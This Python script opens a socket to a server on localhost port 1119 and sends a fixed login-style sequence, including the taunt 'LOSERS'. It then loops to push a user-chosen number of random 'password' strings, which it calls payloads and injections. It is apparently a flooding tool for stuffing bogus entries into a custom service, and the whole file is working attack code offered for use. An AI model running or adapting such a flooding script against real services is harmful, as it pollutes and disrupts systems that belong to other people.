import socket
from random import randint

use=int(input("Enter how many new external lines should the payload create: "))
print(" ")


signs=["A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "F", "V", "X", "Y", "Z", "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "x", "y", "z", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9"]

network = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
ipadress='localhost'
network.connect((ipadress, 1119))
print("Connected to server!", ipadress)

network.send(bytes("13", "utf-8"))
network.send(bytes("test@test.com", "utf-8"))

network.send(bytes("2", "utf-8"))
network.send(bytes("12", "utf-8"))
network.send(bytes("LOSERS", "utf-8"))

for i in range(use):
    payload1=""
    payload2=""
    for i in range(randint(5,15)):
        payload1=payload1+signs[randint(0,60)]
        payload2=payload2+signs[randint(0, 60)]

    print(i+1, "Password is: ", payload1)
    print("  Password is: ", payload2)
    network.send(bytes("rqstnacu", 'utf-8'))

    network.send(bytes("2", "utf-8"))
    network.send(bytes("10", "utf-8"))
    network.send(bytes(str(payload1), "utf-8"))
    network.send(bytes("\n", "utf-8"))
    network.send(bytes(str(payload2), "utf-8"))
    print("Repeating process, ", i)

print("Sended all injections!")
print("Exiting...")
